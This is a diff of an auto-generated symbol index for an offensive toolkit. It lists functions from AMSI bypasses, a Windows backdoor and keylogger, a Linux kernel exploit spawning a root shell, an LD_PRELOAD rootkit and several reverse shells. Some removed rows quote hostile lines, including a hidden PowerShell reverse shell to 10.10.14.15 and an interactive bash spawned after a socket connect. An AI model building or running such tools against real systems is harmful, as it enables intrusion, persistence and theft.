@@ -3937,13 +3937,8 @@
 | `AMS1patch_RastaMouse` | function | `modules/amsi.c:215` | `void AMS1patch_RastaMouse(HANDLE hproc)` |
 | `AMS1patch_ScanBuffer_ret` | function | `modules/amsi.c:166` | `void AMS1patch_ScanBuffer_ret(HANDLE hproc)` |
 | `LoadNtFunctions` | function | `modules/amsi.c:38` | `void LoadNtFunctions()` |
-| `NTSTATUS` | function | `modules/amsi.c:19` | `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T` |
 | `NT_SUCCESS` | macro | `modules/amsi.c:11` | `#define NT_SUCCESS(Status)` |
-| `ZeroMemory` | function | `modules/amsi.c:72` | `ZeroMemory(Patch, 100);` |
-| `exit` | function | `modules/amsi.c:45` | `exit(1);` |
-| `lstrcatA` | function | `modules/amsi.c:75` | `lstrcatA(Patch, "\x75");` |
-| `main` | function | `modules/amsi.c:427` | `int main(int argc, char** argv)` |
-| `printf` | function | `modules/amsi.c:44` | `printf("Failed to get procedure address\n");` |
+| `main` | function | `modules/amsi.c:428` | `int main(int argc, char** argv)` |
 | `BlankAuthResponse` | class | `modules/amt_auth_bypass.py:8` | `class BlankAuthResponse` |
 | `request` | method | `modules/amt_auth_bypass.py:12` | `def request(self, flow)` |
 | `start` | function | `modules/amt_auth_bypass.py:4` | `def start()` |
@@ -4091,40 +4086,14 @@
 | `s3_enumeration` | method | `modules/aws_attacks.py:205` | `def s3_enumeration(self)` |
 | `sts_role_chain` | method | `modules/aws_attacks.py:154` | `def sts_role_chain(self, target_role_arn)` |
 | `summary` | method | `modules/aws_attacks.py:282` | `def summary(self)` |
-| `AllocConsole` | function | `modules/backdoor/backdoor.c:128` | `AllocConsole();` |
-| `MessageBox` | function | `modules/backdoor/backdoor.c:158` | `MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK \| MB_ICONERROR);` |
-| `RegCloseKey` | function | `modules/backdoor/backdoor.c:39` | `RegCloseKey(NewVal);` |
-| `Shell` | function | `modules/backdoor/backdoor.c:83` | `void Shell()` |
-| `ShowWindow` | function | `modules/backdoor/backdoor.c:130` | `ShowWindow(stealth, 0);` |
-| `Sleep` | function | `modules/backdoor/backdoor.c:155` | `Sleep(10);` |
-| `WSACleanup` | function | `modules/backdoor/backdoor.c:98` | `WSACleanup();` |
-| `WinMain` | function | `modules/backdoor/backdoor.c:124` | `int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)` |
-| `bootRun` | function | `modules/backdoor/backdoor.c:17` | `int bootRun()` |
-| `bzero` | macro | `modules/backdoor/backdoor.c:13` | `#define bzero(p, size)` |
-| `bzero` | function | `modules/backdoor/backdoor.c:90` | `jump: bzero(buffer, 1024);` |
-| `chdir` | function | `modules/backdoor/backdoor.c:102` | `chdir(str_cut(buffer, 3, 100));` |
-| `closesocket` | function | `modules/backdoor/backdoor.c:97` | `closesocket(sock);` |
-| `exit` | function | `modules/backdoor/backdoor.c:99` | `exit(0);` |
-| `fclose` | function | `modules/backdoor/backdoor.c:118` | `fclose(fp);` |
-| `memset` | function | `modules/backdoor/backdoor.c:146` | `memset(&ServAddr, 0, sizeof(ServAddr));` |
-| `recv` | function | `modules/backdoor/backdoor.c:94` | `recv(sock, buffer, 1024, 0);` |
-| `send` | function | `modules/backdoor/backdoor.c:27` | `send(sock, err, sizeof(err), 0);` |
-| `str_cut` | function | `modules/backdoor/backdoor.c:47` | `char *
+| `Shell` | function | `modules/backdoor/backdoor.c:84` | `void Shell()` |
+| `WinMain` | function | `modules/backdoor/backdoor.c:125` | `int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)` |
+| `bootRun` | function | `modules/backdoor/backdoor.c:18` | `int bootRun()` |
+| `bzero` | macro | `modules/backdoor/backdoor.c:14` | `#define bzero(p, size)` |
+| `str_cut` | function | `modules/backdoor/backdoor.c:49` | `char *
 str_cut(char str[], int slice_from, int slice_to)` |
-| `strcat` | function | `modules/backdoor/backdoor.c:115` | `strcat(total_response, container);` |
-| `strncpy` | function | `modules/backdoor/backdoor.c:80` | `strncpy(buffer, str, buffer_len);` |
-| `Sleep` | function | `modules/backdoor/keylogger.h:22` | `Sleep(10);` |
-| `fclose` | function | `modules/backdoor/keylogger.h:97` | `fclose(kh);` |
 | `logg` | function | `modules/backdoor/keylogger.h:1` | `DWORD WINAPI logg(LPVOID lpParam)` |
-| `putc` | function | `modules/backdoor/keylogger.h:96` | `putc(showKey,kh);` |
-| `bzero` | function | `modules/backdoor/server.c:54` | `jump: bzero(&buffer, sizeof(buffer));` |
-| `close` | function | `modules/backdoor/server.c:80` | `close(client_socket);` |
-| `fgets` | function | `modules/backdoor/server.c:58` | `fgets(buffer, sizeof(buffer), stdin);` |
-| `main` | function | `modules/backdoor/server.c:9` | `int main()` |
-| `printf` | function | `modules/backdoor/server.c:22` | `printf("Error Setting TCP Socket Options!\n");` |
-| `recv` | function | `modules/backdoor/server.c:71` | `recv(client_socket, response, sizeof(response), 0);` |
-| `strtok` | function | `modules/backdoor/server.c:59` | `strtok(buffer, "\n");` |
-| `write` | function | `modules/backdoor/server.c:60` | `write(client_socket, buffer, sizeof(buffer));` |
+| `main` | function | `modules/backdoor/server.c:10` | `int main()` |
 | `BeaconConfig` | class | `modules/beacon_config_builder.py:44` | `class BeaconConfig` |
 | `BeaconConfigBuilder` | class | `modules/beacon_config_builder.py:239` | `class BeaconConfigBuilder` |
 | `__init__` | method | `modules/beacon_config_builder.py:247` | `def __init__(self, payload)` |
@@ -4952,98 +4921,64 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `process_new_rows` | function | `modules/event_engine.py:176` | `def process_new_rows()` |
 | `read_events` | function | `modules/event_engine.py:233` | `def read_events(limit, status)` |
 | `save_rules` | function | `modules/event_engine.py:109` | `def save_rules(rules)` |
-| `BUFFER` | macro | `modules/exp.c:55` | `#define BUFFER` |
-| `CPU_SET` | function | `modules/exp.c:442` | `CPU_SET(cpu_n, &set);` |
-| `CPU_ZERO` | function | `modules/exp.c:440` | `CPU_ZERO(&set);` |
+| `BUFFER` | macro | `modules/exp.c:56` | `#define BUFFER` |
 | `DESC_MAX` | macro | `modules/exp.c:54` | `#define DESC_MAX` |
 | `ERROR_PREFIX` | macro | `modules/exp.c:58` | `#define ERROR_PREFIX` |
-| `INBOUND` | macro | `modules/exp.c:50` | `#define INBOUND` |
-| `KEY_DESC_MAX_SIZE` | macro | `modules/exp.c:59` | `#define KEY_DESC_MAX_SIZE` |
-| `MQUEUE_NUM` | macro | `modules/exp.c:48` | `#define MQUEUE_NUM` |
+| `INBOUND` | macro | `modules/exp.c:52` | `#define INBOUND` |
+| `KEY_DESC_MAX_SIZE` | macro | `modules/exp.c:60` | `#define KEY_DESC_MAX_SIZE` |
+| `MQUEUE_NUM` | macro | `modules/exp.c:49` | `#define MQUEUE_NUM` |
 | `Msg` | struct | `modules/exp.c:100` | `` |
 | `NAMELEN` | macro | `modules/exp.c:57` | `#define NAMELEN` |
 | `OUTBOUND` | macro | `modules/exp.c:53` | `#define OUTBOUND` |
-| `PHYSMAP_MASK` | macro | `modules/exp.c:66` | `#define PHYSMAP_MASK` |
-| `PREFIX_BUF_LEN` | macro | `modules/exp.c:61` | `#define PREFIX_BUF_LEN` |
+| `PHYSMAP_MASK` | macro | `modules/exp.c:67` | `#define PHYSMAP_MASK` |
+| `PREFIX_BUF_LEN` | macro | `modules/exp.c:62` | `#define PREFIX_BUF_LEN` |
 | `RCU_HEAD_LEN` | macro | `modules/exp.c:63` | `#define RCU_HEAD_LEN` |
-| `SPRAY_KEY_SIZE` | macro | `modules/exp.c:64` | `#define SPRAY_KEY_SIZE` |
-| `SPRAY_NB_ENTRIES` | macro | `modules/exp.c:70` | `#define SPRAY_NB_ENTRIES` |
-| `SPRAY_SIZE` | macro | `modules/exp.c:68` | `#define SPRAY_SIZE` |
+| `SPRAY_KEY_SIZE` | macro | `modules/exp.c:65` | `#define SPRAY_KEY_SIZE` |
+| `SPRAY_NB_ENTRIES` | macro | `modules/exp.c:71` | `#define SPRAY_NB_ENTRIES` |
+| `SPRAY_SIZE` | macro | `modules/exp.c:69` | `#define SPRAY_SIZE` |
 | `_GNU_SOURCE` | macro | `modules/exp.c:2` | `#define _GNU_SOURCE` |
-| `add_key` | function | `modules/exp.c:144` | `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...` |
-| `awake_partial_keys` | function | `modules/exp.c:270` | `void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx)` |
-| `bye` | function | `modules/exp.c:154` | `void bye(char *info)` |
-| `bye2` | function | `modules/exp.c:166` | `void bye2(char *info, char *arg)` |
-| `close` | function | `modules/exp.c:306` | `close(temp);` |
-| `create_dummy_file` | function | `modules/exp.c:563` | `void create_dummy_file(void)` |
-| `create_priv_file` | function | `modules/exp.c:571` | `void create_priv_file(void)` |
-| `do_error_exit` | function | `modules/exp.c:160` | `void do_error_exit(char *info)` |
-| `err` | function | `modules/exp.c:375` | `err(1, "mnl_socket_open");` |
-| `execve` | function | `modules/exp.c:649` | `execve("/tmp/dummy", NULL, NULL);` |
-| `exit` | function | `modules/exp.c:158` | `exit(-2);` |
+| `add_key` | function | `modules/exp.c:147` | `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...` |
+| `awake_partial_keys` | function | `modules/exp.c:271` | `void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx)` |
+| `bye` | function | `modules/exp.c:155` | `void bye(char *info)` |
+| `bye2` | function | `modules/exp.c:167` | `void bye2(char *info, char *arg)` |
+| `create_dummy_file` | function | `modules/exp.c:564` | `void create_dummy_file(void)` |
+| `create_priv_file` | function | `modules/exp.c:572` | `void create_priv_file(void)` |
+| `do_error_exit` | function | `modules/exp.c:161` | `void do_error_exit(char *info)` |
 | `fd_uring` | struct | `modules/exp.c:131` | `` |
-| `free` | function | `modules/exp.c:286` | `free(id_buffer);` |
-| `gather_mqueue` | function | `modules/exp.c:462` | `int gather_mqueue(mqd_t mqdes, int gather_size)` |
-| `gather_mqueue_nosave` | function | `modules/exp.c:484` | `int gather_mqueue_nosave(mqd_t mqdes, int gather_size)` |
-| `get_keyring_leak` | function | `modules/exp.c:247` | `int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)` |
-| `io_uring_register` | function | `modules/exp.c:523` | `static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args)` |
-| `io_uring_setup` | function | `modules/exp.c:519` | `static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p)` |
+| `gather_mqueue` | function | `modules/exp.c:463` | `int gather_mqueue(mqd_t mqdes, int gather_size)` |
+| `gather_mqueue_nosave` | function | `modules/exp.c:485` | `int gather_mqueue_nosave(mqd_t mqdes, int gather_size)` |
+| `get_keyring_leak` | function | `modules/exp.c:248` | `int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)` |
+| `io_uring_register` | function | `modules/exp.c:524` | `static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args)` |
+| `io_uring_setup` | function | `modules/exp.c:520` | `static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p)` |
 | `key_serial_t` | type_alias | `modules/exp.c:135` | `typedef int32_t key_serial_t;` |
-| `keyctl` | function | `modules/exp.c:150` | `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...` |
+| `keyctl` | function | `modules/exp.c:151` | `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...` |
 | `keyring_payload` | struct | `modules/exp.c:120` | `` |
 | `leak` | struct | `modules/exp.c:126` | `` |
-| `main` | function | `modules/exp.c:619` | `int main(int argc, char ** argv)` |
-| `memcpy` | function | `modules/exp.c:197` | `memcpy(temp+0x0, &next, 8);` |
-| `memset` | function | `modules/exp.c:504` | `memset(spray->mtext, 0x41, size - 0x30);` |
-| `mnl_nlmsg_batch_next` | function | `modules/exp.c:353` | `mnl_nlmsg_batch_next(batch);` |
-| `mq_receive` | function | `modules/exp.c:491` | `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);` |
+| `main` | function | `modules/exp.c:620` | `int main(int argc, char ** argv)` |
 | `msg` | struct | `modules/exp.c:84` | `` |
 | `msg_header` | struct | `modules/exp.c:90` | `` |
 | `nft_trans_phase` | enum | `modules/exp.c:77` | `` |
-| `nftnl_batch_begin` | function | `modules/exp.c:351` | `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);` |
-| `nftnl_batch_end` | function | `modules/exp.c:370` | `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);` |
-| `nftnl_expr_set_str` | function | `modules/exp.c:403` | `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");` |
-| `nftnl_expr_set_u32` | function | `modules/exp.c:404` | `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);` |
-| `nftnl_set_add_expr` | function | `modules/exp.c:405` | `nftnl_set_add_expr(set_trigger, exprs[exprid]);` |
-| `nftnl_set_free` | function | `modules/exp.c:368` | `nftnl_set_free(set_stable);` |
-| `nftnl_set_nlmsg_build_payload` | function | `modules/exp.c:367` | `nftnl_set_nlmsg_build_payload(nlh, set_stable);` |
-| `nftnl_set_set_str` | function | `modules/exp.c:336` | `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);` |
-| `nftnl_set_set_u32` | function | `modules/exp.c:338` | `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);` |
-| `nftnl_table_nlmsg_build_payload` | function | `modules/exp.c:360` | `nftnl_table_nlmsg_build_payload(nlh, table);` |
-| `nftnl_table_set_str` | function | `modules/exp.c:331` | `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);` |
-| `nftnl_table_set_u32` | function | `modules/exp.c:332` | `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);` |
-| `perror` | function | `modules/exp.c:513` | `perror("msgsend failure");` |
-| `prepare_root_shell` | function | `modules/exp.c:558` | `void prepare_root_shell(void)` |
-| `printf` | function | `modules/exp.c:169` | `printf(info, arg);` |
-| `puts` | function | `modules/exp.c:157` | `puts(info);` |
-| `read` | function | `modules/exp.c:588` | `read(fd_modprobe, modprobe_name, 14);` |
-| `release_keys` | function | `modules/exp.c:276` | `void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)` |
-| `release_partial_keys` | function | `modules/exp.c:289` | `void release_partial_keys(key_serial_t *id_buffer, int i)` |
-| `release_partial_uring` | function | `modules/exp.c:553` | `void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx)` |
-| `release_uring` | function | `modules/exp.c:545` | `void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size)` |
-| `sema_down` | function | `modules/exp.c:614` | `void sema_down(int *sema)` |
-| `sema_up` | function | `modules/exp.c:609` | `void sema_up(int *sema)` |
-| `set_cpu_affinity` | function | `modules/exp.c:437` | `void set_cpu_affinity(int cpu_n, pid_t pid)` |
-| `set_stable_table_and_set` | function | `modules/exp.c:320` | `void set_stable_table_and_set(struct mnl_socket* nl, const char *name)` |
-| `set_trigger_set_and_overwrite` | function | `modules/exp.c:384` | `void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)` |
-| `setup_modprobe_payload` | function | `modules/exp.c:600` | `void setup_modprobe_payload()` |
-| `setvbuf` | function | `modules/exp.c:622` | `setvbuf(stdin, 0, 2, 0);` |
-| `sleep` | function | `modules/exp.c:646` | `sleep(1);` |
-| `snprintf` | function | `modules/exp.c:181` | `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);` |
-| `spray_keyring` | function | `modules/exp.c:171` | `key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)` |
-| `spray_keyring_list_del_purpose` | function | `modules/exp.c:189` | `key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, u...` |
-| `spray_keyring_list_overwrite_purpose` | function | `modules/exp.c:213` | `key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t of...` |
-| `spray_mqueue` | function | `modules/exp.c:447` | `void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)` |
-| `spray_msg_msg` | function | `modules/exp.c:495` | `void spray_msg_msg(unsigned int size, unsigned int amount, int qid)` |
-| `spray_uring` | function | `modules/exp.c:527` | `struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer)` |
-| `syscall` | function | `modules/exp.c:148` | `return syscall(__NR_add_key, type, description, payload, plen, ringid);` |
-| `system` | function | `modules/exp.c:578` | `system("gcc -o /tmp/shell /tmp/shell.c -w");` |
-| `unshare` | function | `modules/exp.c:301` | `unshare(CLONE_NEWNS\|CLONE_NEWUSER\|CLONE_NEWNET);` |
-| `unshare_setup` | function | `modules/exp.c:295` | `void unshare_setup(uid_t uid, gid_t gid)` |
+| `prepare_root_shell` | function | `modules/exp.c:559` | `void prepare_root_shell(void)` |
+| `release_keys` | function | `modules/exp.c:279` | `void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)` |
+| `release_partial_keys` | function | `modules/exp.c:290` | `void release_partial_keys(key_serial_t *id_buffer, int i)` |
+| `release_partial_uring` | function | `modules/exp.c:554` | `void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx)` |
+| `release_uring` | function | `modules/exp.c:546` | `void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size)` |
+| `sema_down` | function | `modules/exp.c:615` | `void sema_down(int *sema)` |
+| `sema_up` | function | `modules/exp.c:610` | `void sema_up(int *sema)` |
+| `set_cpu_affinity` | function | `modules/exp.c:438` | `void set_cpu_affinity(int cpu_n, pid_t pid)` |
+| `set_stable_table_and_set` | function | `modules/exp.c:322` | `void set_stable_table_and_set(struct mnl_socket* nl, const char *name)` |
+| `set_trigger_set_and_overwrite` | function | `modules/exp.c:385` | `void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)` |
+| `setup_modprobe_payload` | function | `modules/exp.c:601` | `void setup_modprobe_payload()` |
+| `spray_keyring` | function | `modules/exp.c:172` | `key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)` |
+| `spray_keyring_list_del_purpose` | function | `modules/exp.c:190` | `key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, u...` |
+| `spray_keyring_list_overwrite_purpose` | function | `modules/exp.c:214` | `key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t of...` |
+| `spray_mqueue` | function | `modules/exp.c:448` | `void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)` |
+| `spray_msg_msg` | function | `modules/exp.c:496` | `void spray_msg_msg(unsigned int size, unsigned int amount, int qid)` |
+| `spray_uring` | function | `modules/exp.c:529` | `struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer)` |
+| `unshare_setup` | function | `modules/exp.c:297` | `void unshare_setup(uid_t uid, gid_t gid)` |
 | `user_rule_t` | struct | `modules/exp.c:105` | `` |
-| `userland_T` | function | `modules/exp.c:604` | `void userland_T(int *sema)` |
-| `write` | function | `modules/exp.c:305` | `write(temp, "deny", strlen("deny"));` |
-| `write_new_modprobe` | function | `modules/exp.c:581` | `void write_new_modprobe()` |
+| `userland_T` | function | `modules/exp.c:605` | `void userland_T(int *sema)` |
+| `write_new_modprobe` | function | `modules/exp.c:582` | `void write_new_modprobe()` |
 | `ChainResult` | class | `modules/exploit_chain.py:65` | `class ChainResult` |
 | `ExploitChain` | class | `modules/exploit_chain.py:289` | `class ExploitChain` |
 | `ExploitResult` | class | `modules/exploit_chain.py:54` | `class ExploitResult` |
@@ -6548,21 +6483,12 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `reverse_morse_code` | method | `modules/morse.py:98` | `def reverse_morse_code()` |
 | `run_driver` | method | `modules/morse.py:186` | `def run_driver(config)` |
 | `text_to_morse` | method | `modules/morse.py:109` | `def text_to_morse(text, config)` |
-| `ATTACKERS_IP` | macro | `modules/mysql_hookandroot_lib.c:63` | `#define ATTACKERS_IP` |
+| `ATTACKERS_IP` | macro | `modules/mysql_hookandroot_lib.c:64` | `#define ATTACKERS_IP` |
 | `INJECTED_CONF` | macro | `modules/mysql_hookandroot_lib.c:66` | `#define INJECTED_CONF` |
 | `SHELL_PORT` | macro | `modules/mysql_hookandroot_lib.c:65` | `#define SHELL_PORT` |
-| `_GNU_SOURCE` | macro | `modules/mysql_hookandroot_lib.c:49` | `#define _GNU_SOURCE` |
-| `close` | function | `modules/mysql_hookandroot_lib.c:135` | `close(fd);` |
-| `config_cleanup` | function | `modules/mysql_hookandroot_lib.c:145` | `config_cleanup();` |
-| `connect` | function | `modules/mysql_hookandroot_lib.c:85` | `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));` |
-| `execle` | function | `modules/mysql_hookandroot_lib.c:88` | `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );` |
+| `_GNU_SOURCE` | macro | `modules/mysql_hookandroot_lib.c:50` | `#define _GNU_SOURCE` |
 | `execvp` | function | `modules/mysql_hookandroot_lib.c:128` | `int execvp(const char* filename, char* const argv[])` |
-| `exit` | function | `modules/mysql_hookandroot_lib.c:89` | `exit(0);` |
-| `fclose` | function | `modules/mysql_hookandroot_lib.c:121` | `fclose(conf);` |
-| `fgets` | function | `modules/mysql_hookandroot_lib.c:114` | `fgets(buffer, sizeof(buffer), conf);` |
-| `old_execvp` | function | `modules/mysql_hookandroot_lib.c:146` | `return old_execvp(filename, argv);` |
 | `reverse_shell` | function | `modules/mysql_hookandroot_lib.c:74` | `void reverse_shell(void)` |
-| `ssize_t` | function | `modules/mysql_hookandroot_lib.c:69` | `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);` |
 | `NetworkOpsecConfig` | class | `modules/network_opsec.py:23` | `class NetworkOpsecConfig` |
 | `NetworkOpsecEngine` | class | `modules/network_opsec.py:53` | `class NetworkOpsecEngine` |
 | `__init__` | method | `modules/network_opsec.py:83` | `def __init__(self, config)` |
@@ -7110,15 +7036,10 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `execute_string` | method | `modules/resource_script.py:329` | `def execute_string(self, script)` |
 | `print` | method | `modules/resource_script.py:136` | `def print(self, msg)` |
 | `run_command` | method | `modules/resource_script.py:145` | `def run_command(self, cmd)` |
-| `call_usermodehelper` | function | `modules/reverse-shell.c:13` | `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);` |
-| `module_init` | function | `modules/reverse-shell.c:19` | `module_init(reverse_shell_init);` |
-| `printk` | function | `modules/reverse-shell.c:17` | `printk(KERN_INFO "Exiting\n");` |
-| `reverse_shell_exit` | function | `modules/reverse-shell.c:15` | `static void __exit reverse_shell_exit(void)` |
+| `reverse_shell_exit` | function | `modules/reverse-shell.c:16` | `static void __exit reverse_shell_exit(void)` |
 | `reverse_shell_init` | function | `modules/reverse-shell.c:12` | `static int __init reverse_shell_init(void)` |
-| `DllMain` | function | `modules/revshell.c:9` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
-| `WinExec` | function | `modules/revshell.c:7` | `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 44` |
-| `__declspec` | function | `modules/revshell.c:2` | `__declspec(dllexport) void __cdecl xlAutoOpen(void);` |
-| `xlAutoOpen` | function | `modules/revshell.c:4` | `void __cdecl xlAutoOpen()` |
+| `DllMain` | function | `modules/revshell.c:10` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
+| `xlAutoOpen` | function | `modules/revshell.c:5` | `void __cdecl xlAutoOpen()` |
 | `RichDashboard` | class | `modules/rich_tui.py:66` | `class RichDashboard` |
 | `__init__` | method | `modules/rich_tui.py:74` | `def __init__(self, dashboard_engine, refresh_interval, live)` |
 | `_keyboard_listener` | method | `modules/rich_tui.py:148` | `def _keyboard_listener(self)` |
@@ -7173,65 +7094,32 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `PASSWORD` | macro | `modules/rootkit/mr.c:39` | `#define PASSWORD` |
 | `PATH_MAX` | macro | `modules/rootkit/mr.c:41` | `#define PATH_MAX` |
 | `PID_FILE` | macro | `modules/rootkit/mr.c:35` | `#define PID_FILE` |
-| `PORT` | macro | `modules/rootkit/mr.c:30` | `#define PORT` |
+| `PORT` | macro | `modules/rootkit/mr.c:31` | `#define PORT` |
 | `VirtualFile` | struct | `modules/rootkit/mr.c:49` | `` |
-| `check_elevate` | function | `modules/rootkit/mr.c:135` | `int check_elevate()` |
-| `chmod` | function | `modules/rootkit/mr.c:153` | `chmod(path, mode);` |
-| `close` | function | `modules/rootkit/mr.c:332` | `close(sock);` |
-| `closedir` | function | `modules/rootkit/mr.c:558` | `closedir(dir);` |
-| `copy_binary` | function | `modules/rootkit/mr.c:214` | `void copy_binary(const char *source, const char *destination)` |
-| `crontab` | function | `modules/rootkit/mr.c:155` | `void crontab(const char *path)` |
-| `dlclose` | function | `modules/rootkit/mr.c:316` | `dlclose(rootkit_handle);` |
+| `check_elevate` | function | `modules/rootkit/mr.c:136` | `int check_elevate()` |
+| `copy_binary` | function | `modules/rootkit/mr.c:215` | `void copy_binary(const char *source, const char *destination)` |
+| `crontab` | function | `modules/rootkit/mr.c:156` | `void crontab(const char *path)` |
 | `ensure_hide_file_exists` | function | `modules/rootkit/mr.c:271` | `void ensure_hide_file_exists()` |
-| `ensure_key_file_exists` | function | `modules/rootkit/mr.c:250` | `void ensure_key_file_exists()` |
+| `ensure_key_file_exists` | function | `modules/rootkit/mr.c:253` | `void ensure_key_file_exists()` |
 | `ensure_ld_preload` | function | `modules/rootkit/mr.c:100` | `void ensure_ld_preload()` |
 | `ensure_pid_file_exists` | function | `modules/rootkit/mr.c:117` | `void ensure_pid_file_exists()` |
-| `execl` | function | `modules/rootkit/mr.c:107` | `execl("/bin/bash", "bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_` |
-| `execvp` | function | `modules/rootkit/mr.c:387` | `execvp("bash", command_args);` |
-| `exit` | function | `modules/rootkit/mr.c:109` | `exit(EXIT_FAILURE);` |
-| `fclose` | function | `modules/rootkit/mr.c:91` | `fclose(profile);` |
-| `fprintf` | function | `modules/rootkit/mr.c:90` | `fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);` |
-| `free` | function | `modules/rootkit/mr.c:197` | `free(filename);` |
-| `fwrite` | function | `modules/rootkit/mr.c:226` | `fwrite(buffer, 1, bytesRead, dest);` |
-| `generate_random_string` | function | `modules/rootkit/mr.c:167` | `char *generate_random_string()` |
-| `get_ld_preload` | function | `modules/rootkit/mr.c:83` | `char *get_ld_preload()` |
-| `getenv` | function | `modules/rootkit/mr.c:85` | `return getenv("LD_PRELOAD");` |
+| `generate_random_string` | function | `modules/rootkit/mr.c:168` | `char *generate_random_string()` |
+| `get_ld_preload` | function | `modules/rootkit/mr.c:84` | `char *get_ld_preload()` |
 | `handle_client` | function | `modules/rootkit/mr.c:321` | `void *handle_client(void *client_socket)` |
 | `infect_command` | function | `modules/rootkit/mr.c:289` | `void infect_command()` |
-| `kde_plasma` | function | `modules/rootkit/mr.c:199` | `void kde_plasma(const char *path)` |
+| `kde_plasma` | function | `modules/rootkit/mr.c:200` | `void kde_plasma(const char *path)` |
 | `load_rootkit` | function | `modules/rootkit/mr.c:303` | `void load_rootkit()` |
-| `main` | function | `modules/rootkit/mr.c:638` | `int main()` |
-| `memset` | function | `modules/rootkit/mr.c:330` | `memset(buffer, 0, BUFFER_SIZE);` |
-| `mkdir` | function | `modules/rootkit/mr.c:247` | `mkdir(dirname(new_path), S_IRWXU \| S_IRWXG \| S_IROTH \| S_IXOTH);` |
-| `mon_shell` | function | `modules/rootkit/mr.c:520` | `void *mon_shell(void *data)` |
-| `pclose` | function | `modules/rootkit/mr.c:130` | `pclose(cmd);` |
-| `perror` | function | `modules/rootkit/mr.c:108` | `perror("execl failed");` |
-| `persist` | function | `modules/rootkit/mr.c:233` | `void persist(const char *path)` |
-| `printf` | function | `modules/rootkit/mr.c:103` | `printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD);` |
-| `pthread_detach` | function | `modules/rootkit/mr.c:703` | `pthread_detach(client_thread);` |
-| `pthread_exit` | function | `modules/rootkit/mr.c:333` | `pthread_exit(NULL);` |
-| `pthread_join` | function | `modules/rootkit/mr.c:707` | `pthread_join(mon_thread, NULL);` |
-| `raise` | function | `modules/rootkit/mr.c:440` | `raise(SIGTERM);` |
-| `reboot_system` | function | `modules/rootkit/mr.c:614` | `void reboot_system()` |
-| `remove` | function | `modules/rootkit/mr.c:164` | `remove(tmp_path);` |
-| `send` | function | `modules/rootkit/mr.c:328` | `send(sock, "Enter password: ", 16, 0);` |
+| `main` | function | `modules/rootkit/mr.c:639` | `int main()` |
+| `mon_shell` | function | `modules/rootkit/mr.c:521` | `void *mon_shell(void *data)` |
+| `persist` | function | `modules/rootkit/mr.c:234` | `void persist(const char *path)` |
+| `reboot_system` | function | `modules/rootkit/mr.c:615` | `void reboot_system()` |
 | `set_ld_preload` | function | `modules/rootkit/mr.c:87` | `void set_ld_preload(const char *ld_preload)` |
